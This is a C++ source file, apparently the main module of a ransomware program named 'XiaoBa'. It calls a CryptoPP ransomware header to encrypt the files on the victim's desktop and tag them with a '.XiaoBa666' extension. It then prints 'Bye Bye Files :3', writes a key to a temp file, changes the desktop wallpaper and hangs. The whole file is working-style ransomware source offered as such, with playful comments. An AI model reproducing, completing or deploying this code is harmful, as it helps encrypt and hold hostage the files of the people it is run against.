#include <Windows.h>
#include <fstream>
#include <iostream>
#include <direct.h>
#include <shlobj.h>
#include <stdio.h>
#include "MainPayload/cryptopp_ransomware_xiaoba.hpp" //CryptoPP Ransomware :D
#include "MainPayload/set_wallpaper.hpp" //Set Wallpaper :D
using namespace std; //std name :D
cryptopp_ransomware_xiaoba crypt; //Crypt :D
LPCSTR desktop_directory() //Desktop Directory :D
{
    static char path[MAX_PATH + 1];
    if (SHGetSpecialFolderPathA(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE))
        return path;
    else
        return "ERROR";
}
std::string GetJPGFile() {
    string str = std::string(".jpg");
    return str;
}

char* ConvertStringToChar() 
{
    char* t = (char*)GetJPGFile().c_str();
    return t;
}
byte* GenerateIV() 
{
    return crypt.get_secret_iv();
}
byte* GenerateKey() {
    return crypt.get_secret_key();
}
byte* CharInp_XiaoBa() {
    return crypt.charinputencrypt((char*)".XiaoBa666");
}
bool EncryptFile_XiaoBa() 
{
    char* dir = (char*)desktop_directory();
    crypt.listfiledirectory(dir);
    return true;
}
int main() 
{
    if (EncryptFile_XiaoBa())
    {
        cout << "[XiaoBa] Bye Bye Files :3" << endl;
    }
    else
    {
        cout << "[XiaoBa] Failed!!!" << endl;
    }
    std::fstream fstr;
    fstr.open("C:\\XiaoBaTemp\\Key.txt");
    fstr << "Key Is: " << GenerateKey() << endl;
    fstr.close();
    SetWallpaper(); //Set Wallpaper :D
    Sleep(INFINITE);
    return 0;
}